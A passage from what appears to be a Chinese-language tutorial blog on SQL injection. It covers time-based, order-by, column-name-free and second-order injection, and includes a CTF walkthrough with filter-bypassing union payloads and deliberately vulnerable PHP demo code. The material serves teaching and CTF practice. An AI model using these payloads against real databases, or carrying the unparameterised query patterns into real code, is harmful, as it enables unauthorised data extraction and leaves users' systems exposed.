result +=<span class="string">&quot; &quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;:&quot;</span>+data</span><br><span class="line">					<span class="built_in">print</span> result</span><br><span class="line">					<span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="0x02报错注入盲注"><a href="#0x02报错注入盲注" class="headerlink" title="0x02报错注入盲注"></a>0x02报错注入盲注</h4><p>简单的说就是它能够通过MYSQL解释器检查，但是运行时候又会产生错的函数。我们可以用它来进行布尔型盲注。我们下面就来讲解一下一些能够通过MYSQL解释器的预检查却在运行时候出现错误的SQL函数。  </p>
<p><a target="_blank" rel="noopener" href="https://chickenmushroom.github.io/2021/01/31/%E6%88%91TMD%E7%83%A6%E6%AD%BB%E4%BA%86%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">参考文章-我TMD烦死了学习笔记</a></p>
<p>例题：工作室靶场的我TMD烦死了</p>
<h4 id="0x03时间盲注"><a href="#0x03时间盲注" class="headerlink" title="0x03时间盲注"></a>0x03时间盲注</h4><p>适用于对页面无变化，无法用布尔盲注判断的情况，一般用到函数 sleep()和 BENCHMARK()。<br>sleep()作用是用来延时 benchmark()其作用是来测试一些函数的执行速度。benchmark()中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式。<br>时间盲注我们还需要使用条件判断函数if() if（expre1，expre2，expre3） 当expre1为true时，返回expre2，false时，返回expre3<br>举个例子：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id=1 and if((substr((select user()),1,1)=&#x27;r&#x27;),sleep(5),1);</span><br></pre></td></tr></table></figure>

<p>如果这两个函数都被ban了我们可以利用笛卡尔积造成延时进行注入。</p>
<p>知识点：笛卡尔积可以将多个表合并成为一个表<br>进行测试：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) FROM information_schema.columns A, information_schema.columns B;</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210530220913466.png" alt="image-20210530220913466"></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(想执行的查询语句,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.columns C),1)%23</span><br></pre></td></tr></table></figure>

<p>比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin where id=1 and if((substr((select user()),1,1)=&#x27;r&#x27;),(SELECT count(*) FROM information_schema.columns A, information_schema.columns B,information_schema.columns C),1)%23</span><br></pre></td></tr></table></figure>

<p>另外还可以用get lock()进行延时盲注</p>
<p>知识点：</p>
<ul>
<li>mysql_pconnect(server,user,pwd,clientflag)</li>
</ul>
<p>mysql_pconnect() 函数打开一个到 MySQL 服务器的持久连接。<br>mysql_pconnect() 和 mysql_connect() 非常相似，但有两个主要区别：当连接的时候本函数将先尝试寻找一个在同一个主机上用同样的用户名和密码已经打开的（持久）连接，如果找到，则返回此连接标识而不打开新连接。其次，当脚本执行完毕后到 SQL 服务器的连接不会被关闭，此连接将保持打开以备以后使用（mysql_close() 不会关闭由 mysql_pconnect() 建立的连接）。</p>
<ul>
<li>get_lock(str,timeout)<br>get_lock会按照key来加锁，别的客户端再以同样的key加锁时就加不了了，处于等待状态。在一个session中锁定变量，同时通过另外一个session执行，将会产生延时</li>
</ul>
<p>进行测试：</p>
<p>首先打开两个查询。</p>
<p>在第一个查询上运行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select get_lock(&#x27;admin&#x27;,5)</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210530222841975.png" alt="image-20210530222841975"></p>
<p>然后再第二个查询上运行同样的语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select get_lock(&#x27;admin&#x27;,5)</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210530222854481.png" alt="image-20210530222854481"></p>
<p>可以看到确实延迟了，那我们在实际中可以利用如下：</p>
<p>先执行1’ and get_lock(1,2)%23使其上锁，然后在执行1’ and if(1,get_lock(1,2),1)%23，看延时进行判断。</p>
<h4 id="0x04order-by盲注"><a href="#0x04order-by盲注" class="headerlink" title="0x04order by盲注"></a>0x04order by盲注</h4><p>order by用于根据指定的列对结果集进行排序。一般上是从0-9a-z这样排序，不区分大小写。<br>首先我们进行测试下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin union select 1,2,3 order by 3</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210530223246417.png" alt="image-20210530223246417"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from admin union select 1,2,&#x27;a&#x27; order by 3</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210530223314693.png" alt="image-20210530223314693"></p>
<p>下面这个直观点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mysql&gt; select * from userinfo union select 1,2,3 order by 3;</span><br><span class="line">+--------+----------+-------------+</span><br><span class="line">| userid | username | user_passwd |</span><br><span class="line">+--------+----------+-------------+</span><br><span class="line">|      1 | 2        | 3           |</span><br><span class="line">|      1 | admin1   | admin1      |</span><br><span class="line">|      3 | admin1   | admin1      |</span><br><span class="line">|      4 | admin1   | admin1      |</span><br><span class="line">|      2 | admin2   | admin2      |</span><br><span class="line">+--------+----------+-------------+</span><br><span class="line">5 rows in set (0.07 sec)</span><br><span class="line"> </span><br><span class="line">mysql&gt; select * from userinfo union select 1,2,&#x27;a&#x27; order by 3;</span><br><span class="line">+--------+----------+-------------+</span><br><span class="line">| userid | username | user_passwd |</span><br><span class="line">+--------+----------+-------------+</span><br><span class="line">|      1 | 2        | a           |</span><br><span class="line">|      1 | admin1   | admin1      |</span><br><span class="line">|      3 | admin1   | admin1      |</span><br><span class="line">|      4 | admin1   | admin1      |</span><br><span class="line">|      2 | admin2   | admin2      |</span><br><span class="line">+--------+----------+-------------+</span><br><span class="line">5 rows in set (0.07 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from userinfo union select 1,2,&#x27;b&#x27; order by 3;</span><br><span class="line">+--------+----------+-------------+</span><br><span class="line">| userid | username | user_passwd |</span><br><span class="line">+--------+----------+-------------+</span><br><span class="line">|      1 | admin1   | admin1      |</span><br><span class="line">|      3 | admin1   | admin1      |</span><br><span class="line">|      4 | admin1   | admin1      |</span><br><span class="line">|      2 | admin2   | admin2      |</span><br><span class="line">|      1 | 2        | b           |</span><br><span class="line">+--------+----------+-------------+</span><br><span class="line">5 rows in set (0.07 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from userinfo union select 1,2,&#x27;ad&#x27; order by 3;</span><br><span class="line">+--------+----------+-------------+</span><br><span class="line">| userid | username | user_passwd |</span><br><span class="line">+--------+----------+-------------+</span><br><span class="line">|      1 | 2        | ad          |</span><br><span class="line">|      1 | admin1   | admin1      |</span><br><span class="line">|      3 | admin1   | admin1      |</span><br><span class="line">|      4 | admin1   | admin1      |</span><br><span class="line">|      2 | admin2   | admin2      |</span><br><span class="line">+--------+----------+-------------+</span><br><span class="line">5 rows in set (0.07 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from userinfo union select 1,2,&#x27;ads&#x27; order by 3;</span><br><span class="line">+--------+----------+-------------+</span><br><span class="line">| userid | username | user_passwd |</span><br><span class="line">+--------+----------+-------------+</span><br><span class="line">|      1 | admin1   | admin1      |</span><br><span class="line">|      3 | admin1   | admin1      |</span><br><span class="line">|      4 | admin1   | admin1      |</span><br><span class="line">|      2 | admin2   | admin2      |</span><br><span class="line">|      1 | 2        | ads         |</span><br><span class="line">+--------+----------+-------------+</span><br><span class="line">5 rows in set (0.07 sec)</span><br></pre></td></tr></table></figure>

<p>我们就可以根据数据排序进行数据注入，猜测出数据，此方法多用与<strong>无列名注入</strong>。</p>
<h3 id="3-注入类型"><a href="#3-注入类型" class="headerlink" title="3.注入类型"></a>3.注入类型</h3><h4 id="3-1无列名注入"><a href="#3-1无列名注入" class="headerlink" title="3.1无列名注入"></a>3.1无列名注入</h4><p><strong>什么是无列名注入？</strong></p>
<p>顾名思义，就是在不知道列名的情况下进行 sql 注入。</p>
<p>在 mysql =&gt; 5 的版本中存在一个名为 information_schema 的库，里面记录着 mysql 中所有表的结构。通常，在 mysql sqli 中，我们会通过此库中的表去获取其他表的结构，也就是表名、列名等。但是这个库经常被 WAF 过滤。</p>
<p>当我们通过暴力破解获取到表名后，如何利用呢？</p>
<p>在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。</p>
<p><strong>使用条件&amp;方法</strong></p>
<p>无列名注入主要是适用于已经获取到数据表，但无法查询列的情况下，在大多数 CTF 题目中，information_schema 库被过滤，使用这种方法获取列名。</p>
<p>无列名注入的原理其实很简单，类似于将我们不知道的列名进行取别名操作，在取别名的同时进行数据查询，所以，如果我们查询的字段多于数据表中列的时候，就会出现报错。</p>
<h5 id="0x01order-by"><a href="#0x01order-by" class="headerlink" title="0x01order by"></a>0x01order by</h5><p>上面已提及，不再阐述</p>
<h5 id="0x02不使用列名查询"><a href="#0x02不使用列名查询" class="headerlink" title="0x02不使用列名查询"></a>0x02不使用列名查询</h5><p>正常的 sql 查询如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `users`;</span><br></pre></td></tr></table></figure>



<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210607230340082.png" alt="image-20210607230340082"></p>
<p>其中，列名为 account、passwd、id。</p>
<p>使用 union 查询：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select * from users;</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210607230436289.png" alt="image-20210607230436289"></p>
<p>如图，我们的列名被替换为了对应的数字。也就是说，我们可以继续数字来对应列，如 2 对应了表里面的 password：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select `2` from (select 1,2,3 union select * from users)a;</span><br></pre></td></tr></table></figure>

<p>ps：末尾的 a 可以是任意字符，用于命名。</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210607230545764.png" alt="image-20210607230545764"></p>
<p>当然，多数情况下，**`**会被过滤。当 **`**不能使用的时候，使用别名来代替：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select b from (select 1,2 as b,3 union select * from users)a;</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210607230736077.png" alt="image-20210607230736077"></p>
<p>同时查询多个列：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat(`1`,0x2d,`2`) from (select 1,2,3,4 union select * from users)a limit 1,3;</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210607230959573.png" alt="image-20210607230959573"></p>
<p>简而言之，可以通过任意命名进入该表，然后使用 SELECT 查询这些字段中的任何已知值。</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select a,b from posts where a=-1 union select 1,(select concat(`3`,0x2d,`4`) from (select 1,2,3,4,5,6 union select * from xxx)a limit 1,1);</span><br></pre></td></tr></table></figure>



<h5 id="0x03union被限制"><a href="#0x03union被限制" class="headerlink" title="0x03union被限制"></a>0x03union被限制</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b) as c);</span><br><span class="line"> </span><br><span class="line">1060 - Duplicate column name &#x27;id&#x27;</span><br></pre></td></tr></table></figure>

<p>可以发现第一个列名已经被爆出来了，那么他的原理到底是什么呢。<br>这个的原理就是在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错。</p>
<p>同时，可以利用using爆其他字段：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b USING(id)) as c);</span><br><span class="line"> </span><br><span class="line">1060 - Duplicate column name &#x27;username&#x27;</span><br><span class="line"> </span><br><span class="line">mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b USING(id,username)) as c);</span><br><span class="line"> </span><br><span class="line">1060 - Duplicate column name &#x27;password&#x27;</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b USING(id,username,`password`)) as c);</span><br><span class="line"> </span><br><span class="line">1060 - Duplicate column name &#x27;email&#x27;</span><br></pre></td></tr></table></figure>



<p>例题：<strong>SWPUCTF 2019</strong>——–<strong>web1-easy_web</strong></p>
<p>进入题目发现有登陆和注册接口，直接注册登录。</p>
<p>来到后台。</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210607231326126.png" alt="image-20210607231326126"></p>
<p>注入点在广告名。</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210607231456157.png" alt="image-20210607231456157"></p>
<p>点击广告详情。</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210607231617459.png" alt="image-20210607231617459"></p>
<p>发现数据库的报错信息，证明存在注入。</p>
<p>简单测试了一下，空格 和 or 被过滤，报错过滤了extractvalue 和 updatexml，于是考虑用 union 联合注入。查表名时由于过滤or，所以information_schema无法使用。<br>但Mysql5.6及以上版本中mysql的 innodb_index_stats 和innodb_table_stats这两个表中都包含所有新创建的数据库和表名</p>
<p>也可以用 sys.schema_auto_increment_columns 来注表名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">111&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/sys.schema_auto_increment_columns),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210607232717376.png" alt="image-20210607232717376"></p>
<p>innodb_index_stats 和innodb_table_stats</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure>

<p>表名 ads 和 users</p>
<p>但是不知道列名，只能用无列名注入的方式，另外还过滤了反引号，用别名aaa来代替，payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from/**/(select/**/1,2,3/**/as/**/b/**/union/**/select * from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,&#x27;22</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210607232850067.png" alt="image-20210607232850067"></p>
<h4 id="3-2二次注入"><a href="#3-2二次注入" class="headerlink" title="3.2二次注入"></a>3.2二次注入</h4><ul>
<li><strong>二次注入原理</strong></li>
</ul>
<p>二次注入漏洞字面上理解可能就是结合两个注入漏洞点实现sql注入的目的，但是这其中还有几个细节需要讲解一下。首先，第一个注入点因为经过过滤处理所以无法触发sql注入漏洞，比如<code>addslashes</code>函数，将单引号等字符转义变成\’。但是存进数据库后，数据又被还原了，也就是反斜杠没了，在这种情况下，如果能发现一个新的注入同时引用了被插入了的数据库数据，就可以实现闭合新发现的注入漏洞引发漏洞。</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/doubleinject.png" alt="doubleinject"></p>
<ul>
<li><strong>演示</strong></li>
</ul>
<p>程序提供用户注册(<code>reg.php</code>)和邮箱搜索(<code>search.php</code>)两个功能，程序在<code>config.php</code>文件中使用<code>addslashes</code>转义所有的GPC输入，然后再将数据插入数据库中</p>
<p>注册信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username:0&#x27;select</span><br><span class="line">password:11</span><br><span class="line">email:5</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210607224627291.png" alt="image-20210607224627291"></p>
<p>如下图所示，用户输入含有<code>&#39;</code>的用户名会完整的存入数据库。</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210607224639404.png" alt="image-20210607224639404"></p>
<p><code>&#39;</code>被安全的存入了数据库，如果又将该用户名从数据库中取出来，然后再用于数据库查询，若没转义该用户名，则会出现二次注入，演示如下:</p>
<p>搜索邮箱：<code>5</code>, 得到mysql报错如下，显然<code>&#39;</code>引发了数据库错误，也就是说这里是可以利用sql注入的。</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210607225002602.png" alt="image-20210607225002602"></p>
<p>这里是可以利用盲注，union注入和报错注入的, 当然，注入的利用还和username等字段的长度限制有关。</p>
<p>注册用户名: <code>&#39; union select 1,user(),2,3 #</code>, 邮箱:<code>cc@qq.com</code>, 然后搜索邮箱<code>cc@qq.com</code>, 得到如下结果:</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210607225254115.png" alt="image-20210607225254115"></p>
<ul>
<li><strong>演示代码</strong></li>
</ul>
<p>config.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mysqli_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=mysqli_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">mysqli_select_db(<span class="variable">$a</span>,<span class="string">&#x27;sqlinject&#x27;</span>);</span><br><span class="line">mysqli_set_charset(<span class="variable">$a</span>,<span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!get_magic_quotes_gpc())&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>))&#123;</span><br><span class="line">        <span class="variable">$_GET</span> = addslashes_deep(<span class="variable">$_GET</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>))&#123;</span><br><span class="line">        <span class="variable">$_POST</span> = addslashes_deep(<span class="variable">$_POST</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_COOKIE</span> = addslashes_deep(<span class="variable">$_COOKIE</span>);</span><br><span class="line">    <span class="variable">$_REQUEST</span> = addslashes_deep(<span class="variable">$_REQUEST</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addslashes_deep</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$value</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> is_array(<span class="variable">$value</span>) ? array_map(<span class="string">&#x27;addslashes_deep&#x27;</span>, <span class="variable">$value</span>): addslashes(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>reg.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO `sqlinject`.`users` (`id`, `username`, `password`, `email`)</span></span><br><span class="line"><span class="string">           VALUE (NULL, &#x27;<span class="subst">$username</span>&#x27;, &#x27;<span class="subst">$password</span>&#x27;, &#x27;<span class="subst">$email</span>&#x27;);&quot;</span>;</span><br><span class="line">    <span class="variable">$row</span> = mysqli_query(<span class="variable">$a</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;注册成功&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;注册失败&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> /&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    username&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;username&quot;</span>&gt;&lt;br/&gt;</span><br><span class="line">    password&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;password&quot;</span>&gt;&lt;br/&gt;</span><br><span class="line">    email&lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;email&quot;</span>&gt;&lt;br/&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;ok&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>

<p>search.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=mysqli_connect(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">mysqli_select_db(<span class="variable">$a</span>,<span class="string">&#x27;sqlinject&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$email</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from users where email=&#x27;<span class="subst">&#123;$email&#125;</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$row</span> = mysqli_query(<span class="variable">$a</span>,<span class="variable">$sql</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="variable">$rows</span> = mysqli_fetch_array(<span class="variable">$row</span>);</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$rows</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from users where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$row</span> = mysqli_query(<span class="variable">$a</span>,<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(mysqli_error(<span class="variable">$a</span>));</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$row</span>)&#123;</span><br><span class="line">            <span class="variable">$rows</span> = mysqli_fetch_array(<span class="variable">$row</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$rows</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$rows</span>[<span class="string">&#x27;password&#x27;</span>].<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$rows</span>[<span class="string">&#x27;email&#x27;</span>].<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> /&gt;</span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    search 